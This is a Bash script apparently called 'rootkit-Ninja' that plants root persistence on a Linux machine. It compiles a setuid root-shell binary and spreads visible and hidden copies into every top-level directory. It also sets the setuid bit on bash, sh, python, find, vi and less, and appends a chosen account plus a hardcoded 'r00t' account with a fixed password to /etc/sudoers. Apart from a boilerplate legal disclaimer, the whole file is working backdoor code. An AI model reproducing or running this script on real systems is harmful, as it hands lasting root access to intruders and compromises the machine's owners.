#!/bin/bash

rampung='\033[0m'
abang='\033[1;31m'
ijo='\033[1;32m'
kuning='\033[1;33m'
putih='\033[1;37m'

banner(){
echo -ne "$putih
	       ___   ___  _   _    _ _          _   _ _       _       
	      / _ \ / _ \| | | |  (_) |        | \ | (_)     (_)      
	 _ __| | | | | | | |_| | ___| |_ ______|  \| |_ _ __  _  __ _ 
	| '__| | | | | | | __| |/ / | __|______| . \` | | '_ \| |/ _\` |
	| |  | |_| | |_| | |_|   <| | |_       | |\  | | | | | | (_| |
	|_|   \___/ \___/ \__|_|\_\_|\__|      |_| \_|_|_| |_| |\__,_|
	                                                    _/ |      
	                                                   |__/       
[+] Author		: Bayu Fedra
[+] Special Thanks 	: Reversing.ID - IndoXploit - Bashid.org - Backbox Linux Indonesia - Zerobyte.ID $kuning
[!] Important		: Make sure you have permisison to run this program
[!] legal disclaimer	: Usage of rootkit-Ninja without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
$putih
[+] Follow my Twitter/Instagram @bayufedraa :D
\n"
sleep 2
}

check_root(){
	uid=$(id -u)
	gid=$(id -g)
	echo "[+] User ID	: $uid"
	echo "[+] Group ID	: $uid"
	if [[ $uid == 0 ]]
	then
		echo -ne "$ijo[+] You are Root!\n[+] Trying to plan rootkit...\n\n $rampung\n"
		sleep 1
	else
		echo -ne "$abang[+] Not root!\n[+] Must Run as Root! $rampung\n"
		exit
	fi
}

binary_rootkit(){

cat << EOF > /tmp/gsh.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

gcc /tmp/gsh.c -o /tmp/gsh
rm /tmp/gsh.c

}

share_binroot(){
	root_dir=$(ls /)
	mkdir /.,

	for i in $root_dir
	do
		if [[ -d /$i ]]
		then
			if [[ $i == tmp ]]
				then
					echo -ne "$ijo[+] Share rootkit in Directory : $i $rampung\n"
					cp /tmp/gsh /$i/.gsh
					chmod +s /$i/gsh
					chmod +s /$i/.gsh
			else
				echo -ne "$ijo[+] Share rootkit in Directory : $i $rampung\n"
				cp /tmp/gsh /$i/gsh
				cp /tmp/gsh /$i/.gsh
				chmod +s /$i/gsh
				chmod +s /$i/.gsh
			fi
		fi
	done
}

python_stickybit(){
	chmod +s /usr/bin/python
	chmod +s /usr/bin/python?
	chmod +s /usr/bin/python???

	root_py=$(ls /usr/bin/python /usr/bin/python? /usr/bin/python???)
	for i in $root_py
	do
		echo -ne "$ijo[+] Add Python Sticky Bit in Python Version : $i $rampung\n"
	done
}

app_r00t(){
	echo -ne "$ijo[+] Add Sticky Bit to find binary $rampung\n"
	echo -ne "$ijo[+] Add Sticky Bit to vi $rampung\n"
	echo -ne "$ijo[+] Add Sticky Bit to less $rampung\n"
	echo -ne "$ijo[+] Add Sticky Bit Bash $rampung\n"
	echo -ne "$ijo[+] Add Sticky Bit SH $rampung\n"
	chmod +s /bin/bash
	chmod +s /bin/sh
	chmod +s /usr/bin/find
	chmod +s /usr/bin/vi
	chmod +s /usr/bin/less
	sleep 2
}

adduser_r00t(){
	echo -ne "\n$putih[+] Create New User equal with root... $rampung\n"
	read -p "[+] Username	: " username
	read -p "[+] Password	: " password 
	echo -ne "$password\n$password\n\n\n\n" | adduser $username
	echo -ne "\n$username	ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
	echo -ne "$putih[+] Create New User equal with root...\n[+] If you forgot your username and password you can use this\n[+] Username	: r00t\n[+] Password	: r00tkitninja $rampung\n"
	echo -ne "r00tkitninja\nr00tkitninja\n\n\n\n\n" | adduser r00t
	echo -ne "\nr00t	ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
}

banner
check_root
binary_rootkit
share_binroot
python_stickybit
app_r00t
adduser_r00t

